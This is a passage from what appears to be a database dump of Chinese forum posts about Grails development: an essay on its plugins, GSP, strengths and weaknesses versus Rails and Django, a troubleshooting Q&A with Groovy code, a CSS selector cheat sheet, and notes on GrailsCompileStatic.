Grails除了核心模块以外的功能几乎都是通过插件方式实现的。实际上，一个Grails插件和一个Grails应用基本是完全一样的，同样可以使用<code>grails run-app</code>命令来运行。区别仅在于一个插件的根目录下需要提供一个<code>FooPlugin.groovy</code>文件，提供插件的一些描述信息。</p>\r\n\r\n<p>Grails插件基本可以做任何事情，Grails社区已经提供了各式各样的插件，发布在Grails官方插件源上。查看现有的官方插件，可以执行下面的命令。</p>\r\n\r\n<pre>\r\n<code class=\"language-bash\">grails list-plugins</code></pre>\r\n\r\n<p>在官方源里看到了需要的插件名称（例如foo-plugin)，安装插件也只需要一条命令即可。</p>\r\n\r\n<pre>\r\n<code class=\"language-bash\">grails install-plugin foo-plugin</code></pre>\r\n\r\n<p>Grails就会下载相应的插件包并解压到本地Grails应用的插件路径下，并自动执行插件自带的安装脚本。</p>\r\n\r\n<p>创建自己的插件也同样轻松。首先通过下面的命令自动建立插件项目</p>\r\n\r\n<pre>\r\n<code class=\"language-bash\">grails create-plugin foo</code></pre>\r\n\r\n<p>Grails就会自动建立一个插件项目，包括一个<code>FooPlugin.groovy</code>的模板文件。编写Grails插件的具体方法可以阅读Grails插件开发文档。编写好了插件以后，准备发布到官方插件源上的话，首先注册一个codehaus帐号，成为Grails Plugins项目成员，并在官方邮件列表上申请发布权限。然后，只需要一条命令就可以自动发布到官方SVN源，提供给所有人下载了。</p>\r\n\r\n<pre>\r\n<code class=\"language-bash\">grails release-plugin</code></pre>\r\n\r\n<p>充分利用好已有的插件，可以进一步加快Grails开发过程。比如我在开发feedlr过程中就使用了Quartz，Searchable，Feeds，OpenID等插件，而且编写并发布了OAuth插件。</p>\r\n\r\n<p><strong>GSP和标签库</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Grails前端开发使用的是GSP（Grails Server Pages），开发者可以使用Grails特定的模板语法编写gsp动态页面，并且可以直接使用Groovy脚本或是各种预定义和自定义的标签库 （taglib）。这么看起来和JSP区别不大，而实际上，Grails带给开发者的是远比名字上的区别大得多的开发效率上的进步。</p>\r\n\r\n<p>首先，虽然不是推荐的做法，但是直接在GSP中使用Groovy脚本的话就直接利用了Groovy快速开发的优势。</p>\r\n\r\n<p>另外，JEE开发者对于JSP标签库的易用性大多有所诟病，常常需要做貌似多余的各种配置。而Grails通过DRY和约定优先于配置的思想，使得GSP 标签库的易用性非常棒。框架预定义的标签库自然是什么配置都不需要就可以直接使用了，而利用了Groovy的动态特性的标签语法，可以相当程度地减少编码 量。</p>\r\n\r\n<p>编写自定义标签相对于JSP更是异常轻松。只需要通过以下命令新建自定义标签库文件，通过groovy的closure方式编写自定义标签，之后什么配置都不需要，就可以直接在GSP中使用新建的自定义标签了。</p>\r\n\r\n<pre>\r\n<code class=\"language-bash\">grails create-tag-lib</code></pre>\r\n\r\n<p>自定义标签库文件存放于应用根路径下的<code>grails-app/taglib</code>目录下，命名规范为<code>XXXTagLib.groovy</code>，通过Grails框架的约定规则就能自动装入了。</p>\r\n\r\n<p><strong>成熟的JEE Stack</strong></p>\r\n\r\n<p>Grails是一个整合了若干已有JEE组件和框架而成的，其中包括了Spring，Spring Workflow，Hibernate，SiteMesh，JUnit，Ant等。这些都是已经相当成熟的开源组件，是开源JEE Stack的事实规范。通过以这些组件为基础，Grails直接就能在企业应用市场占有一定地位。而社区更是为Grails贡献了不少其他JEE开源组件 的插件。对于企业来讲，Grails直接就是一个很有吸引力的快速原型开发框架，可以直接和广泛使用的已有技术很好的整合。这点可能是Grails和 Rails等类似框架相比，对手短期内无法达到的优势。</p>\r\n\r\n<p><strong>没有银弹</strong></p>\r\n\r\n<p>软件开发过程没有银弹，Grails也不是圣杯。虽然Grails拥有众多鲜明特点和优势，但目前来看也有不少缺点。</p>\r\n\r\n<p><strong>JVM的部署环境</strong></p>\r\n\r\n<p>JVM作为Grails的运行环境，是一把双刃剑。在性能出色的同时，JVM对于环境的要求使得Grails应用的部署环境比较有限。由于JVM的特殊 性，时至今日，性价比高的Java服务器依然屈指可数。相对于PHP，Python，甚至Ruby的眼花缭乱的廉价服务器选择，Grails开发者只能眼 红了。这样带来的问题是使用Grails技术的话部署应用的起步成本高，对独立开发者以及对成本敏感的小型创业公司来讲，起步阶段就大多会采用性价比更高 的其他技术。</p>\r\n\r\n<p><strong>复合型框架带来的整合复杂性</strong></p>\r\n\r\n<p>Grails使用多种已有的成熟开源JEE组件，同样是一把双刃剑。多种组件整合在一起，出现整合方面的问题的话调试修改都会比较吃力。典型的例子是 Grails出错的stack trace，往往会包括了从下层JEE框架抛出的大量异常信息，这些噪音对分析问题造成干扰，对一些疑难问题的解决会造成困难。而且这些底层组件都是传统 的JEE组件，调试起来丝毫无法利用到Groovy和Grails的灵活方便的优点。</p>\r\n\r\n<p><strong>开发工具的欠缺</strong></p>\r\n\r\n<p>Grails开发使用什么IDE，这是大多开发者接触Grails时最先提出的问题。可惜的是，这个问题至今没有令人信服的答案。在官方邮件列表上，推荐 比较多的是IntelliJ IDEA，其他可选的是Eclipse，Netbeans。IDEA相对来讲对于Groovy/Grails的支持确实做得最全面，但是对于习惯于开源 IDE的大多数JEE开发者来说，切换到另一个陌生的而且购买费用不低的IDE是个不小的代价，而对于企业来讲为此花钱更换开发环境更是个不小的障碍。 Eclipse和Netbeans的Groovy/Grails支持至今还是比较初步和不稳定，而且进展也相当缓慢。目前我个人更倾向于使用Mac TextMate加上Groovy Grails Bundle。但这并不是一个适合所有人的答案。</p>\r\n\r\n<p><strong>尚不成熟的社区</strong></p>\r\n\r\n<p>这可能是Grails最关键的隐藏的弱点。一个开源项目的成功与否很大程度上取决于其社区。Rails/Ruby，Django/Python，包括 PHP都属于现今最好的开源社区，活跃的社区对开源项目的成长起到巨大的作用。但是Grails的社区至今还是相当小众，在人数和质量上都无法和以上三大 社区相比。一个不成熟的社区带来的一个明显问题就是Grails项目的开发进度比较慢，相关文档和资料缺乏&gt;</p>\r\n\r\n<p>敏捷开发框架横向比较：Grails，Rails，Django</p>\r\n\r\n<p><strong>性能</strong></p>\r\n\r\n<p>和使用Ruby语言的Rails以及使用Python语言的Django相比，使用Groovy语言的Grails可以利用到其整合的JEE组件和JVM本身的性能优势。而在性能是关键的时候，还可以直接使用Java。</p>\r\n\r\n<p>Grails项目负责人Graeme Rocher做过一个比较细致的Grails和Rails性能对比评测。 在Grails 0.5和Rails 1.2.3的对比测试中，在包括数据CRUD操作在内的所有项目中Grails全面超越Rails，某些项目的优势可以达到40%-50%。不过这个测试 是在07年初做的，目前已经比较过时，两个项目也已经经历了不少更新。但是基本上说，借助了JVM性能优势的Grails相比100%纯Ruby的 Rails还是在微观性能测试中占有一定上风。</p>\r\n\r\n<p>由于Ruby默认运行时VM的性能一般，Django采用的Python语言在微性能测试中也要胜于Ruby，但是Grails和Django的直接对比目前似乎还没有详细可靠的资料。</p>\r\n\r\n<p><strong>开发效率</strong></p>\r\n\r\n<p>这三种框架在设计理念上基本是一致的：DRY（Don&#39;t Repeat Yourself，不要重复自己）和约定优于配置（Convention over Configuration），所以在开发效率上三者基本不相上下。</p>\r\n\r\n<p>另外值得一提的是，Groovy语言本身的特点也使其开发效率比Java高出不少，和其他流行动态语言不相上下，对Grails的开发效率功不可没。Grails框架内提供的魔法般的动态方法都是通过Groovy元编程实现的，包括约定优于配置 中Service类的自动注入，builder，codecs等的实现等等。由于篇幅有限此处无法做进一步举例，大家可以从Groovy主页得到详细的资料。</p>\r\n\r\n<p><strong>部署</strong></p>\r\n\r\n<p>应用的部署可能是这三种框架区别最大的一点。</p>\r\n\r\n<p>对于Grails，基本可以部署在任何Java Servlet容器环境下。而在实际情况中，廉价的Java服务器选择很少，一般只能采用VPS或者独立主机的方式部署。而JVM对内存的要求也不低。虽 然有不少在256MB内存的环境下运行Grails的例子，但是要达到实用的性能的话，至少512MB的内存是必须的。比如Feedlr是部署在一台 540MB内存的VPS服务器上（由Linode提供）。</p>\r\n\r\n<p>Rails由于其快速窜红，目前可选的部署服务已经不少了。除了VPS和独立主机外，直接支持Rails的廉价共享主机，甚至Rails云计算服务（Heroku）都是不错的选择。</p>\r\n\r\n<p>和Rails一样，Django的部署服务选择也不少。从廉价的共享主机到云计算服务，特别值得一提的是支持Django的Google App Engine服务，是一个很有吸引力的选择。</p>\r\n\r\n<p><strong>社区</strong></p>\r\n\r\n<p>在本系列上文中提到了Grails在开源社区方面的劣势。Grails目前还是一个很年轻的项目，而Groovy也还是一个年轻而小众的语言。在社区方面，Grails的劣势是比较明显的。</p>\r\n\r\n<p>Rails 社区是三者中最热闹的。在偶像级人物DHH的带领下，Rails的发展确实让人刮目相看。Django的社区依托了历史悠久而成熟的Python社区，也 发展的相当成熟。成熟的开源社区的一大标志就是有众多高质量的社区代码，包括社区开发的组件和贡献的代码。在这方面Rails和Django都非常典型， 两者目前都已经依托社区建立其了一定规模的核心开发团队。而Grails目前还是主要由G2One团队进行开发，从项目进度来看资源比较紧缺，新版本发布 常被推迟。我在开发Feedlr过程中曾为Grails提交过几个补丁和发布了OAuth插件，在此过程中也感觉Grails还需要更多来自社区的帮助。 在此也希望各位爱好Grails的朋友能多多为Grails贡献代码，一起把社区建设的更好。</p>\r\n\r\n<p><strong>Grails的现状和未来</strong></p>\r\n\r\n<p>Grails目前主要被少数独立开发者和小型网站采用，另外在使用JEE的大型公司中也有不少使用Grails进行快速原型开发和试验性项目，包括Oracle，SAP等都有使用Grails的例子。</p>\r\n\r\n<p><strong>Oracle</strong></p>\r\n\r\n<p>Oracle早在JavaOne 06就宣布支持Grails/Groovy，Oracle官方也给出不少通过Grails使用旗下产品的文档：http://www.google.com/search?q=grails%20oracle。</p>\r\n\r\n<p><strong>SAP</strong></p>\r\n\r\n<p>SAP提供了Composition on Grails产品，支持使用Grails和Groovy进行SAP产品的开发。</p>\r\n\r\n<p><strong>LinkedIn</strong></p>\r\n\r\n<p>热门的商务SNS网站LinkedIn有使用Grails进行开发的例子，曾经发布过招聘Grails工程师的广告。LinkedIn官方博客还曾专门介绍过使用Grails进行内部开发的经验。</p>\r\n\r\n<p><strong>更多Grails网站的例子</strong></p>\r\n\r\n<p>Grails官方Wiki提供了更多使用Grails搭建的网站的例子：http://grails.org/Success+Stories</p>\r\n\r\n<p>总的来说，由于Grails基于JEE的架构，企业市场接受Grails的速度比Rails更胜一筹。但目前Grails还没有较大规模和影响的实际案例，企业采用Grails也尚处于尝试阶段。而Grails部署服务的选择还是不多，但是值得一提的是最近出现的Morph Labs提供的云计算服务，直接支持Grails的部署。相信如果配套的部署服务跟上的话，Grails会得到更多开发者的青睐，并且涌现更多有意思的实际网站案例的。</p>\r\n\r\n<p>Groovy和Grails诞生以来一直作为独立的开源社区项目存在，并没有商业支持。在07年9月，Grails和Groovy各自的项目负责人合作成立了G2One公司，专为Grails和Groovy技术提供背后的支持并进行商业化运作。而在08年11月，SpringSource宣布收购G2One。这样，以Spring为基础的Grails正式进入了Spring家族，结束了漂流生涯。这对于Grails以及Groovy社区都是一个非常好的消 息。独立开源项目往往受到资金，人力等问题的困扰，而有了商业公司的支持，项目可以拥有全职开发人员，可以有市场推广的预算，并且通过Spring的品牌 和市场占有率，更能提高Grails和Groovy的知名度和业界影响。在09年，随着收购过渡的完成，我们期待Spring给Grails带来的改变， 而带给开发者一个更出色更成熟的开发工具。</p>\r\n\r\n<p><strong>总结</strong></p>\r\n\r\n<p>Grails是个特色鲜明的Web开发框架。作为一个年轻的开源框架，它有吸引人的特点，但还并不完美。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n','20150422081406',0,39,0,1),(32,'<p>自从Rails和Grails进入人们的视野以来，有关Rails和Grails之间的各种比较就没有停止过。 最近Stephan在其博客上给出了Rails和Grails的工作趋势图。从Rails和Grails工作趋势图中可以看出，Rails正处于快速上升期，Grails上升的趋势相对较缓。</p>\r\n\r\n<p>但是他并没有对此图作出过多评论，正如他所说：&ldquo;如果你想对这一趋势加以评论，我看还是免了吧。已经有很多相关讨论了，每个人都各持己见&rdquo;。</p>\r\n\r\n<p>从另一个张图&mdash;&mdash;Google趋势图，我们可以看看人们对Rails和Grails这两个主题的关注度：</p>\r\n\r\n<p>图中我们可以看到，Rails从2005年开始就进入&ldquo;快速上升期&rdquo;，今年势头开始放慢。而Grails从2006年以来一直处于相对缓慢的增长过程。</p>\r\n\r\n<p>从这两张图中我们可以看出，Rails还是相对比较火爆的，但Grails也在逐步增长。从技术角度来看，这两者又是孰优孰劣呢？我们又该如何选择呢？早些时候Matt Raible在其博文《Grails vs Rails&mdash;&mdash;我的想法》中表达了他的看法。</p>\r\n\r\n<p>关于成熟度问题，Matt Raible认为：</p>\r\n\r\n<p>它们都是优秀的开发架构。Rails更加成熟一些，但是创建环境是相当痛苦的（特别是在Windows上）。对于Java开发人员来说，Grails非常容易创建起来。Grails需要提高的地方是热发布和出错记录堆栈，但这些大概是Groovy语言的问题，出错记录堆栈是惨不忍睹的&mdash;很少在最初的几行指出类和行数。</p>\r\n\r\n<p>关于如何在Rails和Grails之间进行选择的问题，Matt Raible说道：</p>\r\n\r\n<p>&hellip;&hellip;两者都有编程的乐趣，并且有能力大大提高开发效率。如果你熟悉Hibernate、Spring、SiteMesh和JSP，那么你应该学习Grails。如果你精通这些技术，那么你一个小时之内就能学会Grails。&hellip;&hellip;<br />\r\n<br />\r\n有没有Rails能做而Grails不能做的事情？这就不是我能够告诉你的。我想这取决于开发人员的热情和开发团队的选择。如果你是资深的Java开发人员并且喜欢这个生态和它的工具，那么选择Grails就更直观一些。如果你是资深的PHP开发人员或者在J2EE上感觉不好，那么你可能更喜欢Rails一些。对于两个开发框架来说，它们都有一个相同的事情&mdash;&mdash;学习一个实际上会教给你另一个的知识。它们在很多方面都如此相似，以至它们之间的知识可以相互转移。</p>\r\n\r\n<p>冯国平（hivon）已经在其博客中将《Grails vs Rails&mdash;&mdash;我的想法》一文翻译成了中文，有兴趣的读者可以点击这里查看完整的译文。</p>\r\n\r\n<p>高危漏洞频发，隐私泄露，普通开发者该如何避免和防范；开发者如何从逻辑上避免风险？在【QCon北京2015】&ldquo;新时代的安全&rdquo;专题中，在Pwn2Own 2015上夺冠的Keen Team安全研究员Peter Hlavaty将解读内核安全精髓；阿里巴巴安全专家祝建跃将分享互联网全球最大DDoS攻击防御实战。查看详情。</p>\r\n','20150422082017',0,41,0,1),(33,'<p>Q: 如果有多个hasMany映射, 提示错误:&nbsp;<br />\r\nA: 需要定义在一个语句里: static hasMany = [activites:Activity,linkmen:Linkman];&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 如果某个数据库中表没有建立起来:&nbsp;<br />\r\nA1: 一般是domain类的属性定义错误, 定义重复, 或者是属性名和Oracle的关键字重复. 比如title, user就不能作为属性名.&nbsp;<br />\r\nA2: 由于数据库的dbcreate选项用的是update, 所以有时候添加新表的时候建立不了新表. 或有些表的字段无法自动添加, 运行服务器的时候如果访问这样的表会报sql无法执行的错误, 此时需要吧config.groovy里的log4j的hibernate=&quot;off&quot;改为hibernate=&quot;on&quot;, 这时hibernate的详细错误信息会显示在控制台上. 根据提示, 按照映射规则手工加入相应表或字段即可.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 在增加Acegi0.5插件后, 提示java.lang.UnsupportedClassVersionError: Bad version number in .class file :&nbsp;<br />\r\nA: 编译需要jdk1.6, 所以把构建路径的jdk更改成1.6.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: navtive2ascii错误解决办法&nbsp;<br />\r\nA: 右键项目，点击属性 找到 Java构建路径 ，点击库--添加外部jAR 选择JDK下lib文件夹里的 tools.jar确定保存&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: Hibernate自动映射读取其他用户表的解决办法&nbsp;<br />\r\nA: 用dba进入数据库, 把crmdev的dba权限去掉, 只保留connect和resource权限.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 默认用户注册页面注册提示&quot;没有默认的角色&quot;&nbsp;<br />\r\nA: 在角色管理里建立角色user, 进入SecurityConfig.groovy, 添加defaultRole=&quot;user&quot; .&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么在国际化资源文件message.properties里录入的中文, 编译后变成乱码?&nbsp;<br />\r\nA: 首先在属性里确定此文件的编码是utf-8, 如果不是请改成utf-8, 然后用Eclipse编辑器打开此文件, 用Properties界面添加/编辑此文件, 而不要用Source界面编辑. Source界面编辑后的文件经过native2ascii转换后再用Properties界面看就是乱码了.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么页面上显示乱码?&nbsp;<br />\r\nA1: Eclipse所有自动生成的GSP文件默认编码都是ISO-8859-1, 在编辑前一定要手动改成UTF-8编码.<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么GSP页面的按钮国际化后不好使了,提示404错误?&nbsp;<br />\r\nA: 因为按钮如果不指定action, 默认的提交action和value相同, 但是因为value改成了中文, 所以action找不到了. 解决方法是在actionSubmit里显式指定action, 比如action=&quot;edit&quot;.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么建立的角色在用户编辑的时候选不了?&nbsp;<br />\r\nA: 在保存用户的时候要判断角色的名称里包含&quot;ROLE&quot;, 所以建立角色的时候请加&quot;ROLE_&quot;前缀.acegi插件自动生成的代码是这样判断的.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 怎么把数据库字段默认设置成可为空?&nbsp;<br />\r\nA: nullable可以使gorm建表时把字段设置成允许null.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 一个视图内不同Domain的字段重名, 导致绑定params出错怎么办?&nbsp;<br />\r\nA: 最好的做法是在设计Domain时在字段前面加Domain名字的前缀, 这样就可以保证字段不重名了.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么GSP页面报空指针错误?&nbsp;<br />\r\nA: 这个原因可能很多, 但主要是因为某个属性写错了或没加&quot;?&quot;判断, 首先一定要看清是哪个页面, 因为有些保存页面后会调用Show.gsp. 这时不要一直在Create.Gsp找. 其次一般自动生成的代码是没有问题的, 主要看自己填写的代码. 比如添加了delete的message的参数, 如果从别的地方拷贝过来, 很可能参数没有改, 导致报错.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: Null value was assigned to a property of primitive type setter 错误的解决方法?&nbsp;<br />\r\nA: 如果遇到这个错误: Null value was assigned to a property of primitive type setter ，hibernate int型数据无法读取 hiberante读int 整型数据出错 hiberante读数据库出错 解决方法: 把Domain里相应字段从int改为Integer.&nbsp;<br />\r\n.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么Gsp页面Create画面在提交返回校验错误信息后, 关联表的信息都没有了?&nbsp;<br />\r\nA: 比如, 新建Linkman里有Customer的id, 但是在提交后返回&quot;电话不能为空&quot;后, Customer的信息就没有了. 这个产生的原因没有弄清楚提交循环. 在Controller 的Save闭包里, 如果提交有错误, 程序会执行else分支的内容, 返回提交页面, 此时若不把Customer信息读取并返回页面, 就会产生这个问题, 具体实例代码如下:&nbsp;<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def save = { \r\n        def customerInstance = Customer.get(params[\'customer.id\']) \r\n        def linkmanInstance = new Linkman(params) \r\n        linkmanInstance.customer=customerInstance \r\n        if(!linkmanInstance.hasErrors() &amp;&amp; linkmanInstance.save()) { \r\n            flash.message = \"Linkman ${linkmanInstance.id} created\" \r\n            redirect(action:show,id:linkmanInstance.id) \r\n        } \r\n        else { \r\n            render(view:\'create\',model:[linkmanInstance:linkmanInstance,customerInstance:customerInstance]) \r\n        } \r\n    } </code></pre>\r\n\r\n<p><br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 有没有必须使用flush的时候?为什么我向数据库添加时提示:java.lang.NullPointerException: Cannot invoke method XXXMethod() on null object?&nbsp;<br />\r\nA: 这是一个问题, 前一个对象没有真正存到数据库里, 导致后面读取使用这个对象时出错. 所以在存这个对象时, 要flush一下, 即立即执行. 下面是一个例子:&nbsp;<br />\r\n<br />\r\n其中的大写单词都是自定义常量&nbsp;<br />\r\n<br />\r\n&nbsp; if(!Role.findByAuthority(BASE_ADMIN_ROLE)){&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //这里是个需要立即提交的例子,如果这里不提交,下面建立用户时会找不到这个权限, 从而导致出错&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (new Role(authority:BASE_ADMIN_ROLE,description:BASE_ADMIN_ROLE)).save(flush:true)&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!UserInfo.findByUsername(BASE_ADMIN)){&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; def password = authenticateService.encodePassword(BASE_ADMIN)&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; def baseAdmin = new UserInfo(username:BASE_ADMIN,userRealName:BASE_ADMIN,&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; passwd:password,enabled:true,email:&quot;admin@abc.com.cn&quot;).save()&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Role.findByAuthority(BASE_ADMIN_ROLE).addToPeople(baseAdmin);&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么我在Service层里添加代码后在Controller里调用不好使?&nbsp;<br />\r\nA: Service层代码调用是需要先实例化的, 比如IndexController调用UserInfoService, 需要在IndexController里先声明def userInfoService. 这时Spring会自动装配. 然后在需要的地方调用userInfoService.getCurrentUser(session). 另外说明一点, session是需要传过去的. 不像Controller中可以直接调用.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: 为什么我读的数据只显示1条? find和findAll的区别?&nbsp;<br />\r\nA: 这是因为列表是使用的是find, 它只会返回第一条, 但是findAll会返回所有记录.&nbsp;<br />\r\n<br />\r\n<br />\r\n--------------------------------------------------------------------------------&nbsp;<br />\r\n<br />\r\nQ: org.hibernate.MappingException An association from the table ** refers to an unmapped class错误的解决方法?&nbsp;<br />\r\nA: 如果碰到类似org.hibernate.MappingException: An association from the table ** refers to an unmapped class 这样的错误，发现的产生这样错误的原因是: 把域文件另存为了UTF-8编码. 这样在重新启动服务器时就会报这个错误. 解决方法是: 把这个domain文件备份后删除, 重新用Grails生成一个domain文件, 然后把原来的class里的代码拷贝回来. 这样再启动服务器就正常了.</p>\r\n','20150422082329',0,42,0,1),(34,'<p>在运行 grails 之前先用 echo %JAVA_HOME% 看看这个环境变量是否生效</p>\r\n','20150422082516',0,43,0,1),(35,'<p>JAVA_HOME 大写哦，另外设置了环境变量后，控制台要关掉重新打开</p>\r\n','20150422082529',0,43,0,1),(36,'<pre>\r\n<code class=\"language-markdown\">#选择器#\r\n	[id*=section]{} 包含\r\n	[id^=section]{} 开始\r\n	[id$=section]{} 结尾\r\n	[id=section]:before{} :after\r\n##伪类选择器##\r\n	a:link{color:#ff0000;text-decoration:none;}\r\n	a:visited{color:#00ff00;text-decoration:none;}\r\n	a:hover{color:#ff00ff;text-decoration:underline;}\r\n	a:active{color:#0000ff;text-decoration:underline;}\r\n	[id*=input]:focus{border:1px solid #fff;background:skyblue;}\r\n	:root{background:#fbc73b;}\r\n	:empty{background:yellow;}\r\n	:target{background:yellow;} 页面内跳转 高亮显示目标元素\r\n	body:not(h1){background-color:#fff;}\r\n	\r\n	li:nth-first-child{}\r\n	li:nth-last-child{}\r\n	li:nth-child(n){}\r\n	li:nth-child(odd){} 正数奇数li元素\r\n	li:nth-last-child(even){} 倒数偶数li元素\r\n	h2:nth-of-type(odd){}\r\n	h2:nth-last-of-type(even){}\r\n	\r\n	li:nth-child(4n+1){} li:nth-child(4n+2){} li:nth-child(4n+3){} li:nth-child(4n+4){}循环加样式\r\n	li:only-child{} 只有一个子元素指定样式\r\n	[id$=name]:-moz-read-only{background:grey} 只读状态  -moz 表示火狐浏览器\r\n	[id$=pwd]:-moz-read-write{background:white} 非只读状态\r\n	[type=\"radio\"]:indeterminate  一组单选框 没有任何一个被选中时，整组单选框的样式\r\n	[id=\"add\"]:invalid{background-color:red;}\r\n	[id=\"add\"]:valid{background-color:gray;}  \r\n	对页面中使用了required pattern等属性的元素内容不符合元素规定格式时的样式\r\n	[id=pp]::selection{background-color:black;color:white;} 当元素内容被选中时 选中内容的样式\r\n	\r\n	[id=aa]:in-range{}  [id=aa]:out-of-range{}\r\n	&lt;input type=\"number\" id=\"aa\" min=0 max=100 /&gt;\r\n	\r\n##兄弟元素选择器##\r\n    div ~p{}\r\n	&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;\r\n	\r\n##使用选择器 插入内容##\r\n    [id=\"new\"]:after{content:\"\"} content:url(./img/1.png)\r\n    [id=url_img2]:before{content:attr(all);} attr(属性名),指定一个属性名\r\n    &lt;h2 id=\"url_img2\" all=\"这是一个秘密..\"&gt;&lt;/h2&gt;\r\n    \r\n    h2:before{content:counter(count);}\r\n	h2{counter-increment:count;}   增加项目编号\r\n	h2{counter-increment:\'第\'count\'节\';}\r\n	\r\n	[id=effect]:before{content:open-quote;}\r\n	[id=effect]:after{content:close-quote;}\r\n	[id=effect]{quote:\"\\\"\" \"\\\"\";}   添加嵌套文字符号</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150422085408',0,36,0,3),(37,'<p>存储 方式不一样 一个是 链表 一个是数组.</p>\r\n','20150422091831',0,40,0,8),(38,'<p>grails3好多了吧</p>\r\n','20150422110215',0,39,0,10),(39,'<p>在增加个匿名角色吧。login的action增加个匿名的角色</p>\r\n','20150422172441',0,44,0,2),(40,'<p>grails使用的是groovy动态语言，首先你要知道什么事动态语言。什么时静态语言。打个比喻。比如青蛙的三个过程。从受精卵》蝌蚪》青蛙 三个东西本来是一个。可是用java如果你定义一个domain类就没有很好的办法。但是动态语言可以在运行过程中去修改类的属性方法。名字等。但是他们对应的还是一个对象的实例。groovy中的动态性是在运行时和编译时修改的。GrailsCompileStatic &nbsp;这些标签。如果用了就不会动态的调用grails的动态方法了。比如 domain里。还有 controller等。具体的如User.findByXX\\ render()这些都是动态的。但是如果用静态编译，就不能用这些东西了。其实这些东西grails官方文档写的很清楚。你可以认真看一下</p>\r\n\r\n<p>Groovy is a dynamic language and by default Groovy uses a dynamic dispatch mechanism to carry out method calls and property access. This dynamic dispatch mechanism provides a lot of flexibility and power to the language. For example, it is possible to dynamically add methods to classes at runtime and it is possible to dynamically replace existing methods at runtime. Features like these are important and provide a lot of power to the language. However, there are times when you may want to disable this dynamic dispatch in favor of a more static dispatch mechanism and Groovy provides a way to do that. The way to tell the Groovy compiler that a particular class should compiled statically is to mark the class with the&nbsp;groovy.transform.CompileStatic&nbsp;annotation as shown below.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">import groovy.transform.CompileStatic\r\n@CompileStatic class MyClass {\r\n\r\n// this class will be statically compiled...\r\n\r\n}</code></pre>\r\n\r\n<p>See&nbsp;these notes on Groovy static compilation&nbsp;for more details on how&nbsp;<code>CompileStatic</code>&nbsp;works and why you might want to use it.</p>\r\n\r\n<p>One limitation of using&nbsp;<code>CompileStatic</code>&nbsp;is that when you use it you give up access to the power and flexibility offered by dynamic dispatch. For example, in Grails you would not be able to invoke a GORM dynamic finder from a class that is marked with&nbsp;<code>CompileStatic</code>&nbsp;because the compiler cannot verify that the dynamic finder method exists, because it doesn&#39;t exist at compile time. It may be that you want to take advantage of Groovy&#39;s static compilation benefits without giving up access to dynamic dispatch for Grails specific things like dynamic finders and this is where&nbsp;grails.compiler.GrailsCompileStatic&nbsp;comes in.&nbsp;<code>GrailsCompileStatic</code>&nbsp;behaves just 